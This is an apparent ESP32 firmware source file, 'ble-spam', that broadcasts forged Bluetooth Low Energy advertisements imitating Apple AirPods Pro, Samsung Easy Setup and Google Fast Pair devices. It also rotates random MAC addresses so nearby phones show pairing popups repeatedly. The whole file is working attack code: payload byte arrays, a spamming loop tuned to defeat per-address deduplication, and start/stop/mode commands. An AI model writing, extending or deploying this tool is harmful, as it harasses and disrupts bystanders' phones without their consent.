/*
 * TheWave32 / ble-spam
 *
 * Broadcasts BLE advertising packets crafted to trigger pairing popups
 * on nearby devices. Phase-1 skeleton: Apple Continuity AirPods Pro
 * proximity-pairing payload polished and rotating MAC; Samsung and
 * Google modes ship with a minimal, valid-but-basic adv payload that
 * is safe to extend later.
 *
 *   apple   : Apple Continuity manufacturer-specific (OUI 0x004C),
 *             AirPods Pro (subtype 0x07, model 0x0E20)
 *   samsung : Samsung Easy Setup manufacturer-specific (OUI 0x0075)
 *   google  : Google Fast Pair Service Data (UUID 0xFE2C, model id)
 *   random  : round-robin across the three above
 *
 * Random address is rotated each `interval_ms` to maximise popup
 * frequency on iOS / Android; most devices dedupe by source MAC.
 *
 * Sources:
 *   - Apple Continuity Protocol Specification (furiousMAC reverse-engineering)
 *   - Google Fast Pair Service spec (developers.google.com/nearby/fast-pair)
 *   - Bluetooth Core 5.4 Vol 6 Part B sec 1.3.2.1 (static random address: top
 *     two bits = 11, remaining 46 bits not all-0 and not all-1)
 */

#include <inttypes.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/util/util.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"

#include "tw32_cdc_cli.h"
#include "tw32_io.h"
#include "tw32_json_out.h"
#include "tw32_nvs_kv.h"

#define MODULE_NAME    "ble-spam"
#define MODULE_VERSION "0.2.0"

typedef enum { MODE_APPLE = 0, MODE_SAMSUNG, MODE_GOOGLE, MODE_RANDOM } mode_t;

typedef struct {
    /* Cross-context state. Per project convention all multi-writer / cross-
     * task fields use C11 atomics rather than `volatile`, since `volatile`
     * does NOT imply atomicity nor ordering on Xtensa LX7. See
     * firmware/wifi-clock-skew/main/wifi_clock_skew.c for the reference
     * pattern. */
    atomic_bool       running;       /* CLI writes, spammer reads */
    _Atomic uint32_t  mode;          /* CLI writes, spammer reads (mode_t fits in u32) */
    _Atomic uint32_t  interval_ms;   /* CLI writes, spammer reads */
    _Atomic uint32_t  frames_sent;   /* spammer writes, CLI reads */
    _Atomic uint32_t  adv_errors;    /* spammer writes, CLI reads */
    uint8_t           rr_idx;        /* single writer (spammer task) */
    atomic_bool       host_ready;    /* NimBLE host context writes, spammer/CLI read */
} state_t;

static state_t s_state;

/* AirPods Pro proximity-pairing payload (well-known signature).
 * Encoded as a single BLE AD structure that fills the 31-byte legacy
 * advertising PDU after the implicit flags structure is omitted.
 *   1E FF : AD length 0x1E (= 30 bytes following), AD type 0xFF (Mfg Data)
 *   4C 00 : Apple OUI (little-endian)
 *   07 19 : Apple Continuity subtype 0x07 (proximity-pairing),
 *           subtype length 0x19 (= 25 bytes of TLV value)
 *   ...   : 25 bytes of device descriptor (device id + status + colour blob)
 * Total array length = 31 bytes (matches 31-byte legacy adv PDU cap).
 * Reference: Apple Continuity Protocol Specification, furiousMAC repo.
 */
static const uint8_t apple_airpods_pro[] = {
    0x1E, 0xFF,
    0x4C, 0x00,
    0x07, 0x19,
    0x07,                       /* device id high (AirPods Pro) */
    0x20,                       /* device id low (AirPods Pro 2) */
    0x55, 0xAA, 0x01, 0x00,
    0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00,
};

/* Samsung Easy Setup minimal manufacturer adv (OUI 0x0075). */
static const uint8_t samsung_easy_setup[] = {
    0x1B, 0xFF,
    0x75, 0x00,
    0x42, 0x09, 0x81, 0x02,
    0x14, 0x15, 0x12, 0x00,
    0x45, 0x14, 0x16, 0x16,
    0x53, 0xC9, 0xB2, 0x86,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
};

/* Google Fast Pair Service Data (UUID 0xFE2C). Generic model id. */
static const uint8_t google_fast_pair[] = {
    0x09, 0x16,
    0x2C, 0xFE,
    0x00, 0xCD, 0x82,           /* model id (sample) */
    0x00, 0x00, 0x00,           /* reserved */
};

static int rotate_addr(void)
{
    /* Build a static random address per BT Core 5.4 Vol 6 Part B sec 1.3.2.1:
     *   - top two bits of the most significant octet = 11
     *   - the remaining 46 bits must NOT be all-0 and NOT be all-1
     * NimBLE stores the address little-endian, so a.val[5] is the MSB. */
    uint8_t addr[6];
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    addr[0] = (uint8_t)r1;
    addr[1] = (uint8_t)(r1 >> 8);
    addr[2] = (uint8_t)(r1 >> 16);
    addr[3] = (uint8_t)r2;
    addr[4] = (uint8_t)(r2 >> 8);
    addr[5] = (uint8_t)((r2 >> 16) | 0xC0);

    /* Reject the two illegal 46-bit patterns (all-0, all-1). With 46 random
     * bits the probability is ~2^-45 per draw, but the spec mandates the
     * check so we honour it rather than rely on luck. */
    bool all_zero = (addr[0] | addr[1] | addr[2] | addr[3] | addr[4]) == 0
                    && (addr[5] & 0x3F) == 0;
    bool all_one  = (addr[0] & addr[1] & addr[2] & addr[3] & addr[4]) == 0xFF
                    && (addr[5] | 0xC0) == 0xFF && (addr[5] & 0x3F) == 0x3F;
    if (all_zero) addr[0] = 0x01;
    if (all_one)  addr[0] = 0xFE;

    return ble_hs_id_set_rnd(addr);
}

static int set_payload_for(mode_t m)
{
    const uint8_t *p; size_t n;
    switch (m) {
        case MODE_APPLE:   p = apple_airpods_pro;   n = sizeof(apple_airpods_pro); break;
        case MODE_SAMSUNG: p = samsung_easy_setup;  n = sizeof(samsung_easy_setup); break;
        case MODE_GOOGLE:  p = google_fast_pair;    n = sizeof(google_fast_pair); break;
        default:           p = apple_airpods_pro;   n = sizeof(apple_airpods_pro); break;
    }
    return ble_gap_adv_set_data(p, (uint8_t)n);
}

static void spammer_task(void *arg)
{
    (void)arg;
    /* Exponential back-off when adv_start fails persistently (e.g. controller
     * busy, host out of memory, radio coexistence stall). Caps at ~1 s so the
     * task does not wedge for long once the underlying issue clears. */
    uint32_t backoff_ms = 0;

    while (true) {
        if (!atomic_load(&s_state.host_ready) || !atomic_load(&s_state.running)) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        /* Stop is non-blocking; BLE_HS_EALREADY just means nothing was
         * running, which is fine. Other errors are surfaced via adv_errors. */
        int rc_stop = ble_gap_adv_stop();
        if (rc_stop != 0 && rc_stop != BLE_HS_EALREADY) {
            atomic_fetch_add(&s_state.adv_errors, 1);
        }

        mode_t m = (mode_t)atomic_load(&s_state.mode);
        if (m == MODE_RANDOM) {
            m = (mode_t)(s_state.rr_idx % 3);
            s_state.rr_idx++;
        }

        if (rotate_addr() != 0) {
            atomic_fetch_add(&s_state.adv_errors, 1);
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }
        if (set_payload_for(m) != 0) {
            atomic_fetch_add(&s_state.adv_errors, 1);
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }
        struct ble_gap_adv_params params = {
            .conn_mode = BLE_GAP_CONN_MODE_NON,
            .disc_mode = BLE_GAP_DISC_MODE_GEN,
            .itvl_min = 0x20, .itvl_max = 0x40,
        };
        int rc_start = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL,
                                         BLE_HS_FOREVER, &params, NULL, NULL);
        if (rc_start == 0) {
            atomic_fetch_add(&s_state.frames_sent, 1);
            backoff_ms = 0;
        } else {
            atomic_fetch_add(&s_state.adv_errors, 1);
            /* Back off so a persistent failure (e.g. host not actually ready
             * yet, controller wedged) does not spin the loop. Grows 20 -> 40
             * -> 80 -> ... capped at 1000 ms. */
            backoff_ms = (backoff_ms == 0) ? 20
                       : (backoff_ms < 1000 ? backoff_ms * 2 : 1000);
            vTaskDelay(pdMS_TO_TICKS(backoff_ms));
            continue;
        }
        vTaskDelay(pdMS_TO_TICKS(atomic_load(&s_state.interval_ms)));
    }
}

static void on_sync(void)  { atomic_store(&s_state.host_ready, true); }
static void on_reset(int r){ (void)r; atomic_store(&s_state.host_ready, false); }

static void host_task(void *param)
{
    (void)param;
    nimble_port_run();
    nimble_port_freertos_deinit();
}

static void ble_init(void)
{
    nimble_port_init();
    ble_hs_cfg.sync_cb = on_sync;
    ble_hs_cfg.reset_cb = on_reset;
    nimble_port_freertos_init(host_task);
}

/* --- CLI ---------------------------------------------------------------- */

static int cmd_mode(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("mode", "missing_arg"); return -1; }
    mode_t m;
    if      (!strcmp(argv[1], "apple"))   m = MODE_APPLE;
    else if (!strcmp(argv[1], "samsung")) m = MODE_SAMSUNG;
    else if (!strcmp(argv[1], "google"))  m = MODE_GOOGLE;
    else if (!strcmp(argv[1], "random"))  m = MODE_RANDOM;
    else { tw32_cli_ack_err("mode", "bad_mode"); return -1; }
    atomic_store(&s_state.mode, (uint32_t)m);
    tw32_cli_ack_ok("mode");
    return 0;
}

static int cmd_interval(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("interval", "missing_arg"); return -1; }
    long ms = strtol(argv[1], NULL, 10);
    if (ms < 50 || ms > 2000) { tw32_cli_ack_err("interval", "out_of_range"); return -1; }
    atomic_store(&s_state.interval_ms, (uint32_t)ms);
    tw32_cli_ack_ok("interval");
    return 0;
}

static int cmd_start(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;(void)argc;(void)argv;
    atomic_store(&s_state.running, true);
    tw32_cli_ack_ok("start");
    return 0;
}

static int cmd_stop(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;(void)argc;(void)argv;
    atomic_store(&s_state.running, false);
    /* NimBLE GAP APIs are internally serialised by the host mutex, so racing
     * with the spammer task's own stop/start is safe. We still gate on
     * host_ready to avoid spurious BLE_HS_EDISABLED log spam at boot. */
    if (atomic_load(&s_state.host_ready)) ble_gap_adv_stop();
    tw32_cli_ack_ok("stop");
    return 0;
}

static const char *mode_str(mode_t m)
{
    switch (m) {
        case MODE_APPLE:   return "apple";
        case MODE_SAMSUNG: return "samsung";
        case MODE_GOOGLE:  return "google";
        case MODE_RANDOM:  return "random";
    }
    return "unknown";
}

static int cmd_stats(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    tw32_json_begin();
    tw32_json_kv_str ("cmd", "stats");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_uint("frames_sent", atomic_load(&s_state.frames_sent));
    tw32_json_kv_uint("adv_errors",  atomic_load(&s_state.adv_errors));
    tw32_json_kv_str ("mode",        mode_str((mode_t)atomic_load(&s_state.mode)));
    tw32_json_kv_uint("interval_ms", atomic_load(&s_state.interval_ms));
    tw32_json_kv_bool("host_ready",  atomic_load(&s_state.host_ready));
    tw32_json_kv_bool("running",     atomic_load(&s_state.running));
    tw32_json_end();
    return 0;
}

static const tw32_cli_cmd_t cli_table[] = {
    { "mode",     "mode <apple|samsung|google|random>", cmd_mode     },
    { "interval", "interval N (50..2000 ms)",           cmd_interval },
    { "start",    "begin spam",                         cmd_start    },
    { "stop",     "halt spam",                          cmd_stop     },
    { "stats",    "frames + state",                     cmd_stats    },
};

void app_main(void)
{
    /* All atomic_* on BSS-zeroed storage start at 0/false, which is the
     * correct default for everything except the initial mode + interval. */
    atomic_store(&s_state.mode, (uint32_t)MODE_APPLE);
    atomic_store(&s_state.interval_ms, 100u);

    tw32_nvs_init();
    tw32_cdc_init();
    ble_init();
    xTaskCreatePinnedToCore(spammer_task, "tw32-blespam", 4096, NULL, 4, NULL, 1);
    tw32_cli_run(MODULE_NAME, MODULE_VERSION,
                 cli_table, sizeof(cli_table) / sizeof(cli_table[0]));
}
